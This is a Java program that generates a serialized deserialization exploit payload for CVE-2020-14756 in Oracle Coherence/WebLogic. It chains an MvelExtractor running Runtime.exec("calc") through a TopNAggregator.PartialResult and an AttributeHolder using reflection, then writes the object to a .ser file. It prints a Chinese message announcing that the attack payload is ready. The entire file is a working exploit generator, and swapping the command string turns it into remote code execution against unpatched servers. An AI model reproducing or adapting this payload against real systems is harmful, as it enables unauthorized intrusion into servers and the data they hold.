package com.supeream.ga0weI;


import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.util.ExternalizableHelper;
import com.tangosol.util.SortedBag;
import com.tangosol.util.aggregator.TopNAggregator;
import com.tangosol.util.extractor.AbstractExtractor;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;


public class Payloadfor14756 {

    public static void main(String[] args) throws Exception{
        MvelExtractor extractor = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\"calc\");");
        MvelExtractor extractor2 = new MvelExtractor("");
        SortedBag sortedBag = new TopNAggregator.PartialResult(extractor2, 2);
        AttributeHolder attributeHolder = new AttributeHolder();
        sortedBag.add(1);

        Field m_comparator = sortedBag.getClass().getSuperclass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(sortedBag, extractor);

        Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
        setInternalValue.setAccessible(true);
        setInternalValue.invoke(attributeHolder, sortedBag);

        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("CVE_2020_14756.ser"));
        os.writeObject(attributeHolder);
        System.out.println("CVE_2020_14756攻击payload已生成");



    }
}